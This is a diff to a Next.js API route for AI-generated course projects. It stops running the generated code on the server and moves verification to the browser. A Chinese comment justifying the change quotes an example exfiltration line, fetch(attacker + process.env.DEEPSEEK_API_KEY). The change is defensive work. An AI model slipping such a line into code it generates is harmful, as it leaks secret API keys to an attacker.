@@ -1,5 +1,4 @@
 import type { NextApiRequest, NextApiResponse } from 'next';
-import * as ts from 'typescript';
 import {
   AIProviderConfig,
   callAI,
@@ -7,14 +6,7 @@ import {
   extractJson,
   NoProviderError,
 } from '../../src/lib/server/aiProvider';
-import { createTranspiler } from '../../src/lib/engineering/transpile';
-import {
-  coerceProject,
-  describeVerification,
-  StageVerification,
-  validateProjectShape,
-  verifyProject,
-} from '../../src/lib/engineering/validateProject';
+import { coerceProject, validateProjectShape } from '../../src/lib/engineering/validateProject';
 import { addUserProject } from '../../src/lib/server/projectStore';
 import type { EngineeringProject } from '../../src/lib/engineering/types';
 
@@ -147,20 +139,9 @@ Write every zh field in Chinese and every en field in English. The learner's UI 
 interface GenerateResponsePayload {
   success: boolean;
   project?: EngineeringProject;
-  verification?: Array<{ stageId: string; ok: boolean; summary: string; starterAlsoPasses: boolean }>;
+  /** 结构性问题（字段缺失、路径对不上之类），执行层面的问题由浏览器验证后回传 */
   problems?: string[];
   saved: boolean;
-}
-
-function summarise(verifications: StageVerification[]): GenerateResponsePayload['verification'] {
-  return verifications.map((verification) => ({
-    stageId: verification.stageId,
-    ok: verification.ok,
-    starterAlsoPasses: verification.starterAlsoPasses,
-    summary: `${verification.report.totals.passed}/${verification.report.totals.total} cases, ${
-      verification.report.gates.filter((gate) => gate.passed).length
-    }/${verification.report.gates.length} gates`,
-  }));
 }
 
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
@@ -168,18 +149,28 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const transpile = createTranspiler(ts);
-
   try {
-    const { request, config: aiConfig, language = 'zh', project: presetProject, force } = req.body as {
+    const {
+      request,
+      config: aiConfig,
+      language = 'zh',
+      project: presetProject,
+      force,
+      previous,
+      problems: reportedProblems,
+    } = req.body as {
       request?: string;
       config?: AIProviderConfig;
       language?: 'en' | 'zh';
       project?: EngineeringProject;
       force?: boolean;
+      /** 上一版生成结果，配合 problems 走修复轮 */
+      previous?: unknown;
+      /** 浏览器里跑出来的失败信息 */
+      problems?: string[];
     };
 
-    // 「仍然保存」路径：用户接受了一个验证未通过的生成结果
+    // 保存：用户接受了一份生成结果（可能是验证通过的，也可能是「仍然保存」）
     if (presetProject && force) {
       const saved = addUserProject(coerceProject(presetProject));
       return res.status(200).json({ success: true, project: saved, saved: true });
@@ -199,49 +190,41 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
       { role: 'user', content: buildPrompt(request, language) },
     ];
 
-    let raw = await callAI(messages, aiConfig, { temperature: 0.6, maxTokens: 16000 });
-    let project = coerceProject(extractJson<any>(raw));
-    let problems = validateProjectShape(project);
-    let verifications: StageVerification[] = [];
-
-    if (problems.length === 0) {
-      verifications = await verifyProject(project, transpile);
-      const failureReport = describeVerification(verifications);
-      if (failureReport) problems = failureReport.split('\n');
-    }
-
-    // 一轮自动修复：把结构问题和真实运行失败一起喂回去
-    if (problems.length > 0) {
-      const repair: ChatMessage[] = [
-        ...messages,
-        { role: 'assistant', content: raw.slice(0, 60000) },
+    // 修复轮：把上一版和它的失败原因一起喂回去
+    if (previous && Array.isArray(reportedProblems) && reportedProblems.length > 0) {
+      messages.push(
+        { role: 'assistant', content: JSON.stringify(previous).slice(0, 60000) },
         {
           role: 'user',
           content: `The project was executed by the platform and REJECTED. Fix these problems and return the complete corrected JSON (whole object, not a diff):
 
-${problems.join('\n')}
+${reportedProblems.join('\n')}
 
 Remember: reference implementations must actually pass the specs, latency numbers must be computed from the lab config, and starter skeletons must fail the specs.`,
-        },
-      ];
-
-      raw = await callAI(repair, aiConfig, { temperature: 0.3, maxTokens: 16000 });
-      project = coerceProject(extractJson<any>(raw));
-      problems = validateProjectShape(project);
-      if (problems.length === 0) {
-        verifications = await verifyProject(project, transpile);
-        const failureReport = describeVerification(verifications);
-        problems = failureReport ? failureReport.split('\n') : [];
-      }
+        }
+      );
     }
 
-    const verified = problems.length === 0;
+    const raw = await callAI(messages, aiConfig, {
+      temperature: previous ? 0.3 : 0.6,
+      maxTokens: 16000,
+    });
+    const project = coerceProject(extractJson<any>(raw));
+    const structuralProblems = validateProjectShape(project);
+
+    /**
+     * 这里**只做结构校验**，不执行任何生成出来的代码。
+     *
+     * 真跑一遍是必要的（模型经常写出自己都过不了的参考实现），但那必须发生在
+     * 浏览器的 Web Worker 里：它有独立的全局环境，看不到 process.env，也能被
+     * terminate。放在这个 API 进程里跑，一个同步死循环就能让整个服务不再响应，
+     * 而一句 fetch(attacker + process.env.DEEPSEEK_API_KEY) 就能把 key 带走。
+     */
     const payload: GenerateResponsePayload = {
       success: true,
-      project: verified ? addUserProject(project) : project,
-      verification: summarise(verifications),
-      problems: verified ? undefined : problems,
-      saved: verified,
+      project,
+      problems: structuralProblems.length > 0 ? structuralProblems : undefined,
+      saved: false,
     };
 
     return res.status(200).json(payload);
